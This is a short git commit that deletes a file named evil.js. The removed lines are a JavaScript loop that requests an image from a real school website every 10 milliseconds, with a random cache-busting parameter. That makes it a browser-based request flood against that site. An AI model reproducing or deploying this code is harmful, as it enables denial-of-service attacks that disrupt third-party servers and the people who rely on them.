eb2d314af7d304006cee3f31b43f25aa1a7507cb
Naxyz <123858514+Dnayaka@users.noreply.github.com>
2024-11-23 23:10:55 +0700

    Delete evil.js

--- evil.js
+++
@@ -1,6 +0,0 @@
-setInterval(function(){
-    var image = new Image()
-    var rand = Math.floor(Math.random() * 999999999999999999)
-
-    image.src = 'https://smpn1pwt.sch.id/wp-content/uploads/2023/11/kepsek.jpg?' + rand;
-}, 10);
